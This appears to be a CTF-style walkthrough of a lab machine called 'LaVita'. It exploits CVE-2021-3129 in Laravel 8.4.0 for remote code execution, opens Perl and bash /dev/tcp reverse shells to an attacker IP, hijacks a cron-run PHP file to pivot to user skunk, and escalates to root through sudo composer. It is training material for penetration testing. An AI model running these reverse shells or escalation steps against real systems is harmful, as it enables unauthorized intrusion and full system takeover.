##### Tags: `cornjob`  `pspy`  `writerable file`  `CVE-2021-3129`  `Laravel 8.4.0`  `sudo-l`

# 🐧LaVita🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.109.38 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 11:41 AEDT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is running a web of Laravel 8.4.0   
search google and found CVE-2021-3129 and allowing us to use RCE  
  
https://github.com/joshuavanderpoll/CVE-2021-3129
```
$ python3 CVE-2021-3129.py   
  _____   _____   ___ __ ___ _    _____ ___ ___ 
 / __\ \ / / __|_|_  )  \_  ) |__|__ / |_  ) _ \                                                                  
| (__ \ V /| _|___/ / () / /| |___|_ \ |/ /_,  /                                                                  
 \___| \_/ |___| /___\__/___|_|  |___/_/___|/_/                                                                   
 https://github.com/joshuavanderpoll/CVE-2021-3129                                                                
 Using PHPGGC: https://github.com/ambionics/phpggc

[?] Enter host (e.g. https://example.com/) : 192.168.109.38
[?] Would you like to use the previous working chain 'laravel/rce2' [Y/N] : y
[@] Starting the exploit on "http://192.168.109.38/"...
[@] Testing vulnerable URL "http://192.168.109.38/_ignition/execute-solution"...
[√] Host seems vulnerable!
[@] Searching Laravel log file path...
[•] Laravel seems to be running on a Linux based machine.
[√] Laravel log path: "/var/www/html/lavita/storage/logs/laravel.log".
[•] Laravel version found: "8.4.0".
[•] Use "?" for a list of all available actions.

[?] Please enter a command to execute : execute 'id'
[@] Executing command "'id'"...
[@] Generating payload...
[√] Generated 1 payloads.
[@] Trying chain laravel/rce2 [1/1]...
[@] Clearing logs...
[@] Causing error in logs...
[√] Caused error in logs.
[@] Sending payloads...
[√] Sent payload.
[@] Converting payload...
[√] Converted payload.
[√] Output :

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

for some reason, bash and nc doesn't work for me  
to get a reverse shell i used perl
```
[?] Please enter a command to execute : execute perl -e 'use Socket;$i="192.168.45.201";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

```
```
$ nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.109.38] 53402

www-data@debian:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we don't have any privilege then we upload linpeas and found there is a user skunk is in sudo group  
if we can get his account we maybe able to sudo to root
```
╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                            
uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
```
we upload pspy32s to see what is running in the background  
```
www-data@debian:/tmp$ ./pspy32s
./pspy32s
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
2026/02/09 00:49:01 CMD: UID=1001  PID=29773  | sh -c stty -a | grep columns 
2026/02/09 00:49:01 CMD: UID=1001  PID=29772  | stty -a 
2026/02/09 00:49:01 CMD: UID=1001  PID=29777  | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 
2026/02/09 00:49:01 CMD: UID=1001  PID=29778  | sh -c rm -Rf /var/www/html/lavita/public/images/* 
2026/02/09 00:50:01 CMD: UID=1001  PID=29782  | /bin/sh -c /usr/bin/php /var/www/html/lavita/artisan clear:pictures                                                                                                                 
2026/02/09 00:50:02 CMD: UID=1001  PID=29783  | 
2026/02/09 00:50:02 CMD: UID=1001  PID=29785  | 
2026/02/09 00:50:02 CMD: UID=1001  PID=29788  | sh -c stty -a | grep columns 
2026/02/09 00:50:02 CMD: UID=1001  PID=29787  | stty -a 
2026/02/09 00:50:02 CMD: UID=1001  PID=29789  | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 
2026/02/09 00:50:02 CMD: UID=1001  PID=29790  | sh -c rm -Rf /var/www/html/lavita/public/images/*
2026/02/09 00:50:02 CMD: UID=1001  PID=29791  | /bin/sh -c /usr/bin/php /var/www/html/lavita/artisan clear:pictures                                                                                                                 
```
we found that there is a cornjob running every minute by UID=1001 which is skunk  
it is a php script and we found we have write access to the file artisan  
```
www-data@debian:/tmp$ ls -la /var/www/html/lavita/artisan
-rw-r--r-- 1 www-data www-data 1763 Feb  9 01:05 /var/www/html/lavita/artisan
```
so we put our reverseshell payload in the file  
after one minute, we should be able to get the shell of skunk
```
$ echo "<?php shell_exec('bash -c \"bash -i >& /dev/tcp/192.168.45.201/22 0>&1\"'); ?>" > /var/www/html/lavita/artisan

$ nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.109.38] 47062
bash: cannot set terminal process group (32154): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ id
uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
```
## Privilege Escalation

we can run root without password of command composer
```
bash-5.1$ sudo -l
sudo -l
Matching Defaults entries for skunk on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *
```
check GTFOBin and found the way to get root  
https://gtfobins.org/gtfobins/composer/#shell
```
echo '{"scripts":{"x":"/bin/sh"}}' > composer.json
composer run-script x
```
we have to edit composer.json file in /var/www/html/lavita  
but only www-data have this permission  
```
bash-5.1$ ls -la /var/www/html/lavita/composer.json
-rwxr-xr-x  1 www-data www-data      39 Feb  9 01:20 composer.json
```
we switch back to www-data and edit the file
```
echo '{"scripts":{"x":"/bin/sh"}}' > /var/www/html/lavita/composer.json
```
switch to skunk to execute the command 
```
bash-5.1$ sudo /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
Do not run Composer as root/super user! See https://getcomposer.org/root for details
Continue as root/super user [yes]? yes
> /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
